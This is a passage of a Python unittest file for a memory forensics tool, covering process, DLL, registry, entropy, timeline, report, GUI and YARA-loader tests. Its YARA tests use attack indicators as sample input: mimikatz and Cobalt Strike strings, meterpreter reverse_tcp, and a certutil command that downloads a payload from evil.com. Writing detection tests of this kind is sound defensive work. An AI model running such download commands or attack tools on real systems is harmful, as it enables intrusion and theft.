        report = e.get_advanced_ml_report()
        self.assertIsInstance(report, str)
        self.assertIn('ADVANCED ENTERPRISE MALWARE DETECTION REPORT', report)

    def test_advanced_report_no_data(self):
        e = MemoryForensicsEngine()
        report = e.get_advanced_ml_report()
        self.assertIn('No data loaded', report)


class TestEngineEnterpriseScan(unittest.TestCase):
    """Tests for enterprise-grade full scan."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        r = e.run_enterprise_scan()
        self.assertIn('error', r)

    def test_full_scan(self):
        e = _loaded_engine()
        r = e.run_enterprise_scan()
        self.assertIn('layers', r)
        self.assertIn('summary', r)
        self.assertIn('advanced_ml', r['layers'])
        self.assertIn('signatures', r['layers'])
        self.assertIn('behavioral', r['layers'])
        self.assertIn('processes', r['layers'])
        self.assertIn('network', r['layers'])

    def test_summary_structure(self):
        e = _loaded_engine()
        r = e.run_enterprise_scan()
        s = r['summary']
        self.assertIn('threat_score', s)
        self.assertIn('risk_level', s)
        self.assertIn('is_malicious', s)
        self.assertIn('detection_count', s)
        self.assertIn(s['risk_level'], ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'])


class TestEngineDLLs(unittest.TestCase):
    """Tests for DLL analysis."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.analyze_dlls(), [])

    def test_finds_dlls(self):
        e = _loaded_engine()
        dlls = e.analyze_dlls()
        self.assertIsInstance(dlls, list)
        self.assertGreater(len(dlls), 0)

    def test_dll_structure(self):
        e = _loaded_engine()
        dlls = e.analyze_dlls()
        for dll in dlls:
            self.assertIn('name', dll)
            self.assertIn('offset', dll)
            self.assertIn('suspicious', dll)

    def test_finds_suspicious_dlls(self):
        e = _loaded_engine()
        dlls = e.analyze_dlls()
        suspicious = [d for d in dlls if d['suspicious']]
        self.assertGreater(len(suspicious), 0)


class TestEngineRegistry(unittest.TestCase):
    """Tests for registry key extraction."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.extract_registry_keys(), [])

    def test_finds_registry_keys(self):
        e = _loaded_engine()
        keys = e.extract_registry_keys()
        self.assertIsInstance(keys, list)
        self.assertGreater(len(keys), 0)

    def test_registry_artifacts_enhanced(self):
        e = _loaded_engine()
        r = e.extract_registry_artifacts()
        self.assertIn('all_keys', r)
        self.assertIn('suspicious_keys', r)
        self.assertIn('normal_keys', r)
        self.assertIn('total', r)
        self.assertEqual(r['total'], len(r['all_keys']))

    def test_finds_suspicious_registry_keys(self):
        e = _loaded_engine()
        r = e.extract_registry_artifacts()
        self.assertGreater(len(r['suspicious_keys']), 0)


class TestEngineFilePaths(unittest.TestCase):
    """Tests for file path extraction."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.extract_file_paths(), [])

    def test_finds_paths(self):
        e = _loaded_engine()
        paths = e.extract_file_paths()
        self.assertIsInstance(paths, list)
        self.assertGreater(len(paths), 0)

    def test_path_format(self):
        e = _loaded_engine()
        paths = e.extract_file_paths()
        for path in paths:
            self.assertRegex(path, r'^[A-Z]:\\')


class TestEngineBehavioral(unittest.TestCase):
    """Tests for behavioral analysis."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        r = e.behavioral_analysis()
        self.assertEqual(r['score'], 0)
        self.assertEqual(r['level'], 'LOW')

    def test_with_test_dump(self):
        e = _loaded_engine()
        r = e.behavioral_analysis()
        self.assertIn('score', r)
        self.assertIn('level', r)
        self.assertIn('findings', r)
        self.assertIn('info', r)
        self.assertIn(r['level'], ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'])

    def test_findings_structure(self):
        e = _loaded_engine()
        r = e.behavioral_analysis()
        for f in r['findings']:
            self.assertIn('category', f)
            self.assertIn('severity', f)
            self.assertIn('detail', f)

    def test_risk_score_capped(self):
        e = _loaded_engine()
        r = e.behavioral_analysis()
        self.assertLessEqual(r['score'], 100)

    def test_score_stored_on_engine(self):
        e = _loaded_engine()
        e.behavioral_analysis()
        self.assertGreaterEqual(e.risk_score, 0)
        self.assertLessEqual(e.risk_score, 100)


class TestEngineEntropy(unittest.TestCase):
    """Tests for entropy analysis."""

    def test_no_data_entropy_analysis(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.entropy_analysis(), [])

    def test_no_data_calculate(self):
        e = MemoryForensicsEngine()
        r = e.calculate_entropy()
        self.assertEqual(r['overall'], 0.0)

    def test_entropy_blocks(self):
        e = _loaded_engine()
        blocks = e.entropy_analysis()
        self.assertIsInstance(blocks, list)
        self.assertGreater(len(blocks), 0)
        for b in blocks:
            self.assertIn('offset', b)
            self.assertIn('entropy', b)
            self.assertIn('classification', b)
            self.assertGreaterEqual(b['entropy'], 0)
            self.assertLessEqual(b['entropy'], 8.01)

    def test_calculate_entropy(self):
        e = _loaded_engine()
        r = e.calculate_entropy()
        self.assertIn('overall', r)
        self.assertIn('blocks', r)
        self.assertIn('high_entropy_regions', r)
        self.assertIn('classification', r)
        self.assertGreater(r['overall'], 0)

    def test_classification_values(self):
        e = _loaded_engine()
        r = e.calculate_entropy()
        valid = ['Encrypted/Packed', 'Compressed', 'Binary Data', 'Text/Code', 'Sparse/Empty']
        self.assertIn(r['classification'], valid)


class TestEngineHexDump(unittest.TestCase):
    """Tests for hex dump generation."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.hex_dump(0), "")

    def test_hex_dump(self):
        e = _loaded_engine()
        hd = e.hex_dump(0, 64)
        self.assertIsInstance(hd, str)
        self.assertGreater(len(hd), 0)
        # Check format: offset + hex + ascii
        lines = hd.split('\n')
        for line in lines:
            self.assertRegex(line, r'^[0-9a-f]{8}\s')

    def test_hex_dump_middle(self):
        e = _loaded_engine()
        hd = e.hex_dump(1000, 32)
        self.assertIn('000003e8', hd)  # 1000 in hex

    def test_hex_dump_past_end(self):
        e = _loaded_engine()
        hd = e.hex_dump(e.dump_size - 10, 256)
        lines = hd.strip().split('\n')
        self.assertGreater(len(lines), 0)


class TestEngineTimeline(unittest.TestCase):
    """Tests for timeline building."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.build_timeline(), [])

    def test_timeline_events(self):
        e = _loaded_engine()
        events = e.build_timeline()
        self.assertIsInstance(events, list)
        self.assertGreater(len(events), 0)

    def test_event_types(self):
        e = _loaded_engine()
        events = e.build_timeline()
        types = set(ev['type'] for ev in events)
        self.assertIn('Process', types)

    def test_ip_suspicion_logic(self):
        """Bug #8 fix: private IPs should NOT be suspicious, public IPs SHOULD be."""
        e = _loaded_engine()
        events = e.build_timeline()
        for ev in events:
            if ev['type'] == 'IP Address':
                ip = ev['name']
                is_private = (ip.startswith('10.') or ip.startswith('192.168.') or
                              ip.startswith('127.') or ip.startswith('172.16.'))
                if is_private:
                    self.assertFalse(ev.get('suspicious', False),
                                     f"Private IP {ip} should not be suspicious")
                # Public IPs should be suspicious
                if ip == '8.8.8.8' or ip == '185.220.101.42':
                    self.assertTrue(ev.get('suspicious', False),
                                    f"Public IP {ip} should be suspicious")


class TestEngineReport(unittest.TestCase):
    """Tests for report generation."""

    def test_report_structure(self):
        e = _loaded_engine()
        report = e.generate_report()
        self.assertIn('timestamp', report)
        self.assertIn('file_info', report)
        self.assertIn('risk_assessment', report)
        self.assertIn('malware_detections', report)
        self.assertIn('network_artifacts', report)
        self.assertIn('process_count', report)
        self.assertIn('dll_count', report)

    def test_report_file_info(self):
        e = _loaded_engine()
        report = e.generate_report()
        fi = report['file_info']
        self.assertIn('path', fi)
        self.assertIn('size', fi)
        self.assertIn('type', fi)
        self.assertIn('hashes', fi)


class TestEngineFullAnalysis(unittest.TestCase):
    """Tests for run_full_analysis."""

    def test_no_data(self):
        e = MemoryForensicsEngine()
        self.assertEqual(e.run_full_analysis(), {})

    def test_full_analysis(self):
        e = _loaded_engine()
        r = e.run_full_analysis()
        expected_keys = ['processes', 'network', 'malware', 'dlls', 'strings',
                         'behavioral', 'registry', 'file_paths', 'entropy',
                         'timeline', 'hashes', 'dump_type', 'risk_score']
        for key in expected_keys:
            self.assertIn(key, r, f"Missing key: {key}")


# ═══════════════════════════════════════════════════════════════
#  TEST: Report Generator
# ═══════════════════════════════════════════════════════════════

class TestReportGenerator(unittest.TestCase):
    """Tests for the enterprise HTML report generator."""

    def test_import(self):
        from report_generator import generate_enterprise_html_report
        self.assertTrue(callable(generate_enterprise_html_report))

    def test_generate_report(self):
        from report_generator import generate_enterprise_html_report
        e = _loaded_engine()
        with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as f:
            output_path = f.name
        try:
            result = generate_enterprise_html_report(e, output_path)
            self.assertTrue(os.path.exists(output_path))
            with open(output_path, 'r', encoding='utf-8') as f:
                content = f.read()
            self.assertIn('<html', content)
            self.assertIn('FORENSIC', content.upper())
        finally:
            if os.path.exists(output_path):
                os.unlink(output_path)

    def test_report_contains_key_sections(self):
        from report_generator import generate_enterprise_html_report
        e = _loaded_engine()
        with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as f:
            output_path = f.name
        try:
            generate_enterprise_html_report(e, output_path)
            with open(output_path, 'r', encoding='utf-8') as f:
                content = f.read()
            # Check for key HTML report sections
            self.assertIn('Risk', content)
        finally:
            if os.path.exists(output_path):
                os.unlink(output_path)


# ═══════════════════════════════════════════════════════════════
#  TEST: GUI (headless — no display required)
# ═══════════════════════════════════════════════════════════════

class TestGUICreation(unittest.TestCase):
    """Test that GUI can be instantiated headlessly."""

    @classmethod
    def setUpClass(cls):
        """Try to create a Tk root. Skip all tests if no display."""
        try:
            cls.root = MagicMock()
            # We can't easily test real tkinter without a display, but we can
            # verify the class exists and its constructor signature
        except Exception:
            cls.root = None

    def test_gui_class_exists(self):
        from memory_forensics_tool import MemoryForensicsGUI
        self.assertTrue(callable(MemoryForensicsGUI))

    def test_color_scheme(self):
        from memory_forensics_tool import MemoryForensicsGUI
        colors = MemoryForensicsGUI.COLORS
        self.assertIn('bg_dark', colors)
        self.assertIn('accent_blue', colors)
        self.assertIn('accent_red', colors)
        self.assertIn('text_primary', colors)
        # All colors should be valid hex
        for name, color in colors.items():
            self.assertRegex(color, r'^#[0-9a-fA-F]{6}$', f"Invalid color {name}: {color}")

    def test_gui_with_real_tk(self):
        """If a display is available, test real GUI creation."""
        try:
            import tkinter as tk
            root = tk.Tk()
            root.withdraw()
            from memory_forensics_tool import MemoryForensicsGUI
            gui = MemoryForensicsGUI(root)
            # Verify critical widgets exist
            self.assertIsNotNone(gui.engine)
            self.assertIsNotNone(gui.notebook)
            self.assertIsNotNone(gui.progress)
            root.destroy()
        except tk.TclError:
            self.skipTest("No display available for GUI test")


# ═══════════════════════════════════════════════════════════════
#  TEST: Edge Cases & Regression Tests
# ═══════════════════════════════════════════════════════════════

class TestEdgeCases(unittest.TestCase):
    """Edge cases and regression tests for previously found bugs."""

    def test_process_dict_uses_suspicious_key(self):
        """Bug #1: Process dicts must use 'suspicious' key, NOT 'is_suspicious'."""
        e = _loaded_engine()
        procs = e.find_processes()
        for p in procs:
            self.assertIn('suspicious', p)
            self.assertNotIn('is_suspicious', p)

    def test_dll_dict_uses_suspicious_key(self):
        """DLL dicts must also use 'suspicious' key."""
        e = _loaded_engine()
        dlls = e.analyze_dlls()
        for d in dlls:
            self.assertIn('suspicious', d)

    def test_severity_icon_critical(self):
        """Bug #3: CRITICAL severity should map to correct icon/handling."""
        e = _loaded_engine()
        sigs = e.detect_malware_signatures()
        for sig in sigs:
            if sig['severity'] == 'CRITICAL':
                self.assertIn(sig['severity'], ['CRITICAL'])

    def test_behavioral_result_dict_format(self):
        """Bug #4: Dashboard should get dict with .get() access."""
        e = _loaded_engine()
        r = e.behavioral_analysis()
        # Must be a dict, not raw string
        self.assertIsInstance(r, dict)
        # Must support .get() access
        self.assertIsNotNone(r.get('score'))
        self.assertIsNotNone(r.get('level'))
        self.assertIsNotNone(r.get('findings'))

    def test_timeline_ip_suspicion_private_not_suspicious(self):
        """Bug #8: Private IPs should NOT be flagged as suspicious."""
        e = _loaded_engine()
        events = e.build_timeline()
        for ev in events:
            if ev['type'] == 'IP Address':
                ip = ev['name']
                if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
                    self.assertFalse(ev.get('suspicious', False))

    def test_report_uses_suspicious_key(self):
        """Bug #1: generate_enterprise_html_report accesses p['suspicious']."""
        from report_generator import generate_enterprise_html_report
        e = _loaded_engine()
        procs = e.find_processes()
        # Verify the key that the report uses
        for p in procs:
            self.assertIn('suspicious', p)
            # This would raise KeyError if wrong key is used
            _ = p['suspicious']

    def test_empty_engine_no_crash(self):
        """All engine methods should handle no-data gracefully."""
        e = MemoryForensicsEngine()
        self.assertEqual(e.find_processes(), [])
        self.assertEqual(e.extract_network_artifacts(), {})
        self.assertEqual(e.detect_malware_signatures(), [])
        self.assertEqual(e.analyze_dlls(), [])
        self.assertEqual(e.extract_strings(), [])
        self.assertEqual(e.extract_registry_keys(), [])
        self.assertEqual(e.extract_file_paths(), [])
        self.assertEqual(e.entropy_analysis(), [])
        self.assertEqual(e.hex_dump(0), "")
        self.assertEqual(e.build_timeline(), [])
        self.assertEqual(e.run_full_analysis(), {})

    def test_multiple_analyses_dont_accumulate(self):
        """Running analysis multiple times should give consistent results."""
        e = _loaded_engine()
        r1 = e.behavioral_analysis()
        r2 = e.behavioral_analysis()
        self.assertEqual(r1['score'], r2['score'])
        self.assertEqual(len(r1['findings']), len(r2['findings']))


class TestGUIRegressions(unittest.TestCase):
    """Regression tests for GUI handler bugs found in session 4."""

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_bug12_extract_file_paths_resets_registry_stats(self, mock_ttk, mock_tk):
        """Bug #12: extract_file_paths should reset registry-related stat labels."""
        # Verify the source code contains the reset lines
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_file_paths)
        # Must reset Registry Keys and Persistence Keys labels
        self.assertIn("reg_stat_labels['Registry Keys']", source)
        self.assertIn("reg_stat_labels['Persistence Keys']", source)
        # Must clear the persistence indicators panel
        self.assertIn("reg_susp_frame", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_bug12_extract_registry_resets_file_stats(self, mock_ttk, mock_tk):
        """Bug #12: extract_registry should reset file-path-related stat labels."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_registry)
        # Must reset File Paths and System Paths labels
        self.assertIn("reg_stat_labels['File Paths']", source)
        self.assertIn("reg_stat_labels['System Paths']", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_bug13_ml_scan_clears_tree(self, mock_ttk, mock_tk):
        """Bug #13: ml_scan_malware should clear malware_tree before inserting."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.ml_scan_malware)
        # Must contain a delete call on malware_tree
        self.assertIn("malware_tree.delete", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_all_scan_methods_clear_tree(self, mock_ttk, mock_tk):
        """All malware scan methods should clear tree before inserting."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        for method_name in ['scan_malware', 'ml_scan_malware', 'hybrid_malware_scan', 'enterprise_malware_scan']:
            method = getattr(MemoryForensicsGUI, method_name)
            source = inspect.getsource(method)
            self.assertIn("malware_tree.delete", source,
                         f"{method_name} does not clear malware_tree")

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_extract_file_paths_clears_tree(self, mock_ttk, mock_tk):
        """Bug #11 regression: extract_file_paths must clear reg_tree."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_file_paths)
        self.assertIn("reg_tree.get_children", source)
        self.assertIn("reg_tree.delete", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_extract_registry_clears_tree(self, mock_ttk, mock_tk):
        """extract_registry must clear reg_tree before inserting."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.extract_registry)
        self.assertIn("reg_tree.get_children", source)
        self.assertIn("reg_tree.delete", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_shared_tree_handlers_clear_stale_stats(self, mock_ttk, mock_tk):
        """Both registry and file path handlers must reset the other's stats."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI

        # extract_registry resets file path stats
        reg_src = inspect.getsource(MemoryForensicsGUI.extract_registry)
        self.assertIn("File Paths", reg_src)
        self.assertIn("System Paths", reg_src)

        # extract_file_paths resets registry stats
        fp_src = inspect.getsource(MemoryForensicsGUI.extract_file_paths)
        self.assertIn("Registry Keys", fp_src)
        self.assertIn("Persistence Keys", fp_src)


class TestEngineMethodConsistency(unittest.TestCase):
    """Tests for engine method return type consistency."""

    def test_behavioral_analysis_has_info_key(self):
        """behavioral_analysis must return 'info' key for informational findings."""
        e = _loaded_engine()
        result = e.behavioral_analysis()
        self.assertIn('info', result)
        self.assertIsInstance(result['info'], list)

    def test_behavioral_analysis_level_matches_score(self):
        """Level should match score thresholds consistently."""
        e = _loaded_engine()
        result = e.behavioral_analysis()
        score = result['score']
        level = result['level']
        if score >= 70:
            self.assertEqual(level, 'CRITICAL')
        elif score >= 50:
            self.assertEqual(level, 'HIGH')
        elif score >= 25:
            self.assertEqual(level, 'MEDIUM')
        else:
            self.assertEqual(level, 'LOW')

    def test_enterprise_scan_returns_summary(self):
        """Enterprise scan must return summary with required keys."""
        e = _loaded_engine()
        result = e.run_enterprise_scan()
        self.assertIn('summary', result)
        summary = result['summary']
        for key in ['threat_score', 'risk_level', 'is_malicious', 'detection_count', 'precision_estimate']:
            self.assertIn(key, summary, f"Missing key: {key}")

    def test_enterprise_scan_returns_layers(self):
        """Enterprise scan must return all 5 analysis layers."""
        e = _loaded_engine()
        result = e.run_enterprise_scan()
        self.assertIn('layers', result)
        layers = result['layers']
        for layer in ['advanced_ml', 'signatures', 'behavioral', 'processes', 'network']:
            self.assertIn(layer, layers, f"Missing layer: {layer}")

    def test_ml_detect_returns_validation(self):
        """ML detection must return validation info."""
        e = _loaded_engine()
        result = e.ml_detect_malware()
        self.assertIn('validation', result)
        self.assertIn('estimated_precision', result)

    def test_advanced_ml_returns_detections_list(self):
        """Advanced ML must return detections as a list."""
        e = _loaded_engine()
        result = e.advanced_ml_detect()
        self.assertIn('detections', result)
        self.assertIsInstance(result['detections'], list)

    def test_run_full_analysis_returns_all_keys(self):
        """run_full_analysis must return all expected keys."""
        e = _loaded_engine()
        result = e.run_full_analysis()
        expected = ['processes', 'network', 'malware', 'dlls', 'strings',
                    'behavioral', 'registry', 'file_paths', 'entropy',
                    'timeline', 'hashes', 'dump_type', 'risk_score']
        for key in expected:
            self.assertIn(key, result, f"Missing key: {key}")


class TestDataIntegrity(unittest.TestCase):
    """Tests for data integrity and consistency."""

    def test_dump_file_exists(self):
        self.assertTrue(os.path.exists(TEST_DUMP))

    def test_dump_not_empty(self):
        self.assertGreater(os.path.getsize(TEST_DUMP), 0)

    def test_dump_size_reasonable(self):
        """Test dump should be ~100KB"""
        size = os.path.getsize(TEST_DUMP)
        self.assertGreater(size, 50000)
        self.assertLess(size, 200000)

    def test_dump_has_binary_content(self):
        with open(TEST_DUMP, 'rb') as f:
            data = f.read(256)
        # Should start with null bytes (our padding)
        self.assertEqual(data[0], 0)

    def test_dump_hash_reproducible(self):
        with open(TEST_DUMP, 'rb') as f:
            h1 = hashlib.md5(f.read()).hexdigest()
        with open(TEST_DUMP, 'rb') as f:
            h2 = hashlib.md5(f.read()).hexdigest()
        self.assertEqual(h1, h2)


# ═══════════════════════════════════════════════════════════════
#  TEST: Integration Tests
# ═══════════════════════════════════════════════════════════════

class TestIntegration(unittest.TestCase):
    """End-to-end integration tests."""

    def test_load_analyze_report(self):
        """Full pipeline: load → analyze → report."""
        e = MemoryForensicsEngine()
        e.load_dump(TEST_DUMP)
        results = e.run_full_analysis()
        report = e.generate_report()
        self.assertIsInstance(results, dict)
        self.assertIsInstance(report, dict)
        self.assertGreater(len(results), 0)

    def test_load_and_enterprise_scan(self):
        """Full enterprise scan pipeline."""
        e = MemoryForensicsEngine()
        e.load_dump(TEST_DUMP)
        r = e.run_enterprise_scan()
        self.assertIn('summary', r)
        self.assertGreater(r['summary']['threat_score'], 0)

    def test_all_detectors_run_without_error(self):
        """Run every detector on test dump without crashing."""
        e = _loaded_engine()
        e.find_processes()
        e.extract_network_artifacts()
        e.detect_malware_signatures()
        e.analyze_dlls()
        e.extract_strings()
        e.behavioral_analysis()
        e.extract_registry_artifacts()
        e.extract_file_paths()
        e.calculate_entropy()
        e.build_timeline()
        e.ml_detect_malware()
        e.advanced_ml_detect()
        e.run_enterprise_scan()
        e.get_ml_analysis_report()
        e.get_advanced_ml_report()
        e.hex_dump(0, 128)
        e.generate_report()
        e.run_full_analysis()

    def test_json_export_format(self):
        """Results should be JSON-serializable."""
        e = _loaded_engine()
        results = e.run_full_analysis()
        # Should not raise
        json_str = json.dumps(results, indent=2)
        self.assertIsInstance(json_str, str)
        # Should be parseable back
        parsed = json.loads(json_str)
        self.assertEqual(set(results.keys()), set(parsed.keys()))

    def test_html_report_generation(self):
        """Generate a full HTML report and verify it's valid."""
        try:
            from report_generator import generate_enterprise_html_report
        except ImportError:
            self.skipTest("report_generator not available")

        e = _loaded_engine()
        with tempfile.NamedTemporaryFile(suffix='.html', delete=False) as f:
            path = f.name
        try:
            generate_enterprise_html_report(e, path)
            self.assertTrue(os.path.exists(path))
            size = os.path.getsize(path)
            self.assertGreater(size, 1000)  # Should be substantial
        finally:
            if os.path.exists(path):
                os.unlink(path)


# ═══════════════════════════════════════════════════════════════
#  TEST: External YARA Loader
# ═══════════════════════════════════════════════════════════════

class TestExternalYARALoader(unittest.TestCase):
    """Tests for the ExternalYARALoader class."""

    @classmethod
    def setUpClass(cls):
        rules_dir = os.path.join(_script_dir, 'yara_rules')
        if os.path.isdir(rules_dir):
            cls.loader = ExternalYARALoader(rules_dir)
            cls.has_rules = True
        else:
            cls.loader = None
            cls.has_rules = False

    def test_loader_initializes(self):
        """ExternalYARALoader should initialize without error."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        self.assertIsNotNone(self.loader)

    def test_rules_loaded(self):
        """Should load a substantial number of rules."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        stats = self.loader.get_stats()
        self.assertGreater(stats['rules'], 100, "Expected 100+ rules loaded")
        self.assertGreater(stats['files'], 50, "Expected 50+ .yar files parsed")

    def test_text_patterns_extracted(self):
        """Should extract text patterns from rules."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        stats = self.loader.get_stats()
        self.assertGreater(stats['text_patterns'], 200, "Expected 200+ text patterns")

    def test_pattern_index_built(self):
        """Pattern index should have entries for fast lookup."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        self.assertGreater(len(self.loader.pattern_index), 100)

    def test_match_mimikatz(self):
        """Should match 'mimikatz' against credential theft rules."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("mimikatz sekurlsa kerberos wdigest")
        self.assertGreater(len(matches), 0, "Expected YARA match for mimikatz")
        rule_names = [m['rule_name'] for m in matches]
        self.assertTrue(any('Mimikatz' in r or 'mimikatz' in r.lower() for r in rule_names))

    def test_match_cobalt_strike(self):
        """Should match Cobalt Strike beacon patterns."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("beacon.dll beacon.x64.dll ReflectiveLoader")
        self.assertGreater(len(matches), 0, "Expected YARA match for Cobalt Strike")

    def test_no_match_for_benign(self):
        """Should NOT match benign process names."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("chrome.exe")
        self.assertEqual(len(matches), 0, "chrome.exe should not trigger YARA rules")

    def test_no_match_for_svchost(self):
        """Should NOT match legitimate system processes."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("svchost.exe")
        self.assertEqual(len(matches), 0, "svchost.exe should not trigger YARA rules")

    def test_severity_in_matches(self):
        """Matched rules should include severity metadata."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("mimikatz sekurlsa gentilkiwi kerberos")
        if matches:
            self.assertIn('severity', matches[0])
            self.assertIn(matches[0]['severity'].lower(), ['critical', 'high', 'medium', 'low'])

    def test_match_lolbin_certutil(self):
        """Should match certutil abuse pattern."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("certutil -urlcache -split http://evil.com/payload")
        self.assertGreater(len(matches), 0, "Expected YARA match for certutil abuse")

    def test_match_returns_rule_name(self):
        """Matches should include rule_name field."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("meterpreter metsrv stdapi reverse_tcp")
        if matches:
            self.assertIn('rule_name', matches[0])
            self.assertIn('description', matches[0])

    def test_empty_text_no_matches(self):
        """Empty text should return no matches."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        matches = self.loader.match_text("")
        self.assertEqual(len(matches), 0)

    def test_nonexistent_dir(self):
        """Loading from nonexistent directory should not crash."""
        loader = ExternalYARALoader("/nonexistent/path/does/not/exist")
        stats = loader.get_stats()
        self.assertEqual(stats['rules'], 0)

    def test_get_stats_keys(self):
        """get_stats should return expected keys."""
        if not self.has_rules:
            self.skipTest("yara_rules directory not found")
        stats = self.loader.get_stats()
        for key in ['rules', 'files', 'text_patterns', 'errors']:
            self.assertIn(key, stats)


class TestEnhancedProcessCheck(unittest.TestCase):
    """Tests for the enhanced hybrid ML process check pipeline."""

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_score_yara_matches_critical(self, mock_ttk, mock_tk):
        """Critical YARA matches should score 40 per match."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._score_yara_matches)
        self.assertIn("'critical': 40", source)
        self.assertIn("min(100", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_enhanced_check_has_4_layers(self, mock_ttk, mock_tk):
        """_enhanced_process_check should implement 4 detection layers."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        # Layer 1: heuristic
        self.assertIn("_check_suspicious_process", source)
        # Layer 2: YARA
        self.assertIn("yara_loader", source)
        self.assertIn("match_text", source)
        # Layer 3: behavioral
        self.assertIn("_get_process_details", source)
        self.assertIn("_analyze_process_behavior", source)
        # Layer 4: ensemble
        self.assertIn("ensemble_score", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_enhanced_check_returns_4_values(self, mock_ttk, mock_tk):
        """_enhanced_process_check should return (is_susp, reason, score, details)."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        # Must return detection_details dict
        self.assertIn("detection_details", source)
        self.assertIn("return is_suspicious, reason_str, ensemble_score, detection_details", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_enhanced_check_has_corroboration_logic(self, mock_ttk, mock_tk):
        """Should boost scores when multiple layers agree."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        self.assertIn("high_layers", source)
        self.assertIn("1.15", source)  # corroboration boost
        self.assertIn("0.85", source)  # dampening

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_enhanced_check_has_named_malware_override(self, mock_ttk, mock_tk):
        """Critical YARA matches with 2+ strings should override to 95+."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._enhanced_process_check)
        self.assertIn("95", source)
        self.assertIn("match_count", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_monitor_loop_uses_enhanced_check(self, mock_ttk, mock_tk):
        """Monitor loop should call _enhanced_process_check for deep analysis."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        self.assertIn("_enhanced_process_check", source)
        self.assertIn("candidates_for_deep", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_monitor_loop_limits_deep_analysis(self, mock_ttk, mock_tk):
        """Monitor loop should limit deep analysis to max 5 per cycle."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        self.assertIn("[:5]", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_monitor_loop_includes_yara_in_alerts(self, mock_ttk, mock_tk):
        """Monitor alerts should include YARA match information."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI._realtime_monitor_loop)
        self.assertIn("yara_info", source)
        self.assertIn("[YARA:", source)

    @patch('memory_forensics_tool.tk')
    @patch('memory_forensics_tool.ttk')
    def test_realtime_tab_initializes_yara_loader(self, mock_ttk, mock_tk):
        """create_realtime_tab should initialize yara_loader attribute."""
        import inspect
        from memory_forensics_tool import MemoryForensicsGUI
        source = inspect.getsource(MemoryForensicsGUI.create_realtime_tab)
        self.assertIn("self.yara_loader", source)
        self.assertIn("_init_yara_loader", source)

    @patch('memory_forensics_tool.tk')
